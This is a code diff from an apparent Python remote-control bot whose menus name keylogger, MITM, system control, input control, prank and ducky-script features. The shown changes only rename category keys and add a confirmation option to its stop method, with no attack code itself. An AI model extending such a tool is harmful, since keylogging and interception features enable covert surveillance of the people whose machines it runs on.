+        return self.generate_category_menu("audio", "🔊 Audio & Volume")
 
     def menu_soundfx(self):
         print("Opening sound effects menu")
-        return self.generate_category_menu("🎵 Sound FX", "🎵 Sound Effects")
+        return self.generate_category_menu("sound_fx", "🎵 Sound Effects")
 
     def menu_pranks(self):
         print("Opening pranks menu")
-        return self.generate_category_menu("😈 Pranks", "😈 Pranks & Visuals")
+        return self.generate_category_menu("pranks", "😈 Pranks & Visuals")
 
     def menu_control(self):
         print("Opening control menu")
-        return self.generate_category_menu("💻 System Control", "💻 System Control")
+        return self.generate_category_menu("system_control", "💻 System Control")
 
     def menu_input(self):
         print("Opening input menu")
-        return self.generate_category_menu("🎮 Input", "🎮 Input / Device Control")
+        return self.generate_category_menu("input", "🎮 Input / Device Control")
 
     def menu_messaging(self):
         print("Opening messaging menu")
-        return self.generate_category_menu("📋 Messaging", "📋 Messaging")
+        return self.generate_category_menu("messaging", "📋 Messaging")
 
     def menu_cantopen(self):
         print("Opening cantopen menu")
-        return self.generate_category_menu("🔒 Can't Open", "🔒 Can't Open List")
+        return self.generate_category_menu("cant_open", "🔒 Can't Open List")
 
     def menu_keylogger(self):
         print("Opening keylogger menu")
-        return self.generate_category_menu("🧠 Keylogger", "🧠 Keylogger")
+        return self.generate_category_menu("keylogger", "🧠 Keylogger")
 
     def menu_mitm(self):
         print("Opening MITM menu")
-        return self.generate_category_menu("🕵️‍♂️ MITM", "🕵️‍♂️ MITM")
+        return self.generate_category_menu("mitm", "🕵️‍♂️ MITM")
 
     def menu_misc(self):
         print("Opening misc menu")
-        return self.generate_category_menu("🦑 Misc", "🦑 Misc")
+        return self.generate_category_menu("misc", "🦑 Misc")
 
     def menu_plugins(self):
         print("Opening plugins menu")
-        return self.generate_category_menu("🔌 PlugIns", "🔌 Your Plugins")
+        return self.generate_category_menu("plugins", "🔌 Your Plugins")
+
 
     def menu_ducky(self):
         print("Opening ducky script menu")
@@ -2499,9 +2514,13 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
                 self.bsend("🛑 Interrupted by host machine, bye bye.")
                 self.running = False
 
-    def stop(self) -> None:
+    def stop(self, confirm=True) -> None:
         print("Stopping bot")
-        if self.ask_yesno():
+        if confirm:
+            stop = self.ask_yesno()
+        else:
+            stop = True
+        if stop:
             self.running = False
             self.clear()
             self.bsend("🛑 Interrupted by you, bye bye.")
